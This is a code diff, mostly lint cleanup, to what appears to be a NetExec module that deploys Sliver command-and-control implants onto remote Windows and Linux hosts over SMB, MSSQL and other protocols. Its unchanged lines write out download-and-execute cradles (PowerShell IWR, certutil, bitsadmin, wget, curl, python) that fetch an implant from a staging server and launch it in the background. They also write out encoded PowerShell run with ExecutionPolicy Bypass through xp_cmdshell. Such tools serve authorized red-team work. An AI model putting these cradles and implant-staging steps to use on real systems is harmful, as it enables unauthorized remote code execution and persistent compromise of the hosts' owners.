@@ -1,7 +1,6 @@
 import time
 import sys
 import os
-import socket
 import asyncio
 import tempfile
 import secrets
@@ -10,8 +9,6 @@ import threading
 import queue
 import logging
 import base64
-import gzip
-import textwrap
 from abc import ABC, abstractmethod
 
 # Lazy import for nxc dependencies to support testing
@@ -633,7 +630,6 @@ class MSSQLHandler(ProtocolHandler):
 
         # Run chunked upload (mssqlexec skips toggle since enabled)
         def exec_ps_cmd(ps_cmd):
-            import base64
             encoded_script = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
             shell_cmd = f'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
             return connection.execute(shell_cmd)
@@ -893,7 +889,7 @@ class NXCModule:
         if cleanup_value:
             cleanup_str = str(cleanup_value).lower()
             if cleanup_str not in ("always", "success", "never"):
-                context.log.fail(f"CLEANUP_MODE must be one of: always, success, never (default: always)")
+                context.log.fail("CLEANUP_MODE must be one of: always, success, never (default: always)")
                 context.log.fail("")
                 context.log.fail("Examples:")
                 context.log.fail("  -o CLEANUP_MODE=always    # Always cleanup (default)")
@@ -1156,7 +1152,7 @@ class NXCModule:
 
         if protocol in high_priv_protocols and not connection.admin_privs:
             if protocol == "mssql":
-                context.log.warning(f"Low-priv MSSQL login; skipping (requires sysadmin). Try: -M mssql_priv -o ACTION=privesc")
+                context.log.warning("Low-priv MSSQL login; skipping (requires sysadmin). Try: -M mssql_priv -o ACTION=privesc")
             else:
                 context.log.warning(f"Low-priv login on {protocol}; skipping (requires admin).")
             return
@@ -1166,7 +1162,7 @@ class NXCModule:
         except ValueError as e:
             # Catch connection errors with helpful messages (e.g., proxychains localnet hint)
             context.log.fail(str(e))
-        except Exception as e:
+        except Exception:
             # Unexpected errors should still be raised for debugging
             raise
 
@@ -1266,7 +1262,7 @@ class NXCModule:
                     context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.stager_protocol.upper()})")
                     full_remote_path = None  # In-memory; no cleanup needed
             else:
-                ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
+                self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
                 implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
                 tmp_path = self._save_implant_to_temp(implant_data)
                 self.local_implant_path = tmp_path
@@ -1317,8 +1313,8 @@ class NXCModule:
         protocol = connection.__class__.__name__.lower()
         
         # 1. Generate full implant EXE
-        context.log.display(f"Generating implant for HTTP staging...")
-        ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
+        context.log.display("Generating implant for HTTP staging...")
+        self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
         implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
         
         # 2. Create unique website and upload implant
@@ -1349,8 +1345,8 @@ class NXCModule:
             if "ALREADY_EXISTS" in error_msg or "in use" in error_msg:
                 context.log.fail(f"Port {stager_port} is already in use by another listener.")
                 context.log.fail("Solutions:")
-                context.log.fail(f"  1. Use a different port: -o STAGING_PORT=8081")
-                context.log.fail(f"  2. In Sliver console, list active listeners with: jobs, kill existing listener: jobs -k <job_id>")
+                context.log.fail("  1. Use a different port: -o STAGING_PORT=8081")
+                context.log.fail("  2. In Sliver console, list active listeners with: jobs, kill existing listener: jobs -k <job_id>")
                 sys.exit(1)
             raise
         listener_job_id = listener_resp.JobID
@@ -1371,7 +1367,7 @@ class NXCModule:
                     f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
                     f'Start-Process $env:TEMP\\{implant_name}"'
                 )
-                context.log.debug(f"Using PowerShell staging method")
+                context.log.debug("Using PowerShell staging method")
             elif self.staging_method == "certutil":
                 # Certutil download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
@@ -1381,7 +1377,7 @@ class NXCModule:
                     f'"cmd /c certutil -urlcache -f {download_url} '
                     f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
                 )
-                context.log.debug(f"Using certutil staging method")
+                context.log.debug("Using certutil staging method")
             elif self.staging_method == "bitsadmin":
                 # BITSAdmin download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
@@ -1391,7 +1387,7 @@ class NXCModule:
                     f'"cmd /c bitsadmin /transfer job /download /priority high '
                     f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
                 )
-                context.log.debug(f"Using bitsadmin staging method")
+                context.log.debug("Using bitsadmin staging method")
             else:
                 context.log.fail(f"Staging method '{self.staging_method}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
                 sys.exit(1)
@@ -1406,7 +1402,7 @@ class NXCModule:
                     f'chmod +x {tmp_path} && '
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
-                context.log.debug(f"Using wget staging method")
+                context.log.debug("Using wget staging method")
             elif self.staging_method == "curl":
                 # curl download + execute in background
                 cmd = (
@@ -1414,7 +1410,7 @@ class NXCModule:
                     f'chmod +x {tmp_path} && '
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
-                context.log.debug(f"Using curl staging method")
+                context.log.debug("Using curl staging method")
             elif self.staging_method == "python":
                 # Python urllib download + execute in background
                 cmd = (
@@ -1423,7 +1419,7 @@ class NXCModule:
                     f'chmod +x {tmp_path} && '
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
-                context.log.debug(f"Using python staging method")
+                context.log.debug("Using python staging method")
             else:
                 context.log.fail(f"Staging method '{self.staging_method}' not supported for Linux. Use: wget, curl, or python")
                 sys.exit(1)
@@ -1464,11 +1460,11 @@ class NXCModule:
                 connection.execute(cmd)
                 context.log.info("Download cradle executed via MSSQL (xp_cmdshell)")
             finally:
-                # Restore original socket timeout
+                # Restore original timeout
                 if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
                     try:
                         connection.conn.socket.settimeout(original_timeout)
-                    except:
+                    except (AttributeError, OSError):
                         pass  # Ignore errors restoring timeout
         elif protocol == "smb":
             # SMB: Execute download cradle via smbexec
@@ -1794,7 +1790,7 @@ class NXCModule:
             stage_req = clientpb.ImplantStageReq()
             stage_req.Build.append(build_id)
             self._worker_submit('stage_implant_build', stage_req)
-            context.log.debug(f"Stage 2 registered on listener")
+            context.log.debug("Stage 2 registered on listener")
             
             # Construct download URL for bootstrap based on stager protocol
             # Bootstrap will fetch Stage 2 from this URL at runtime
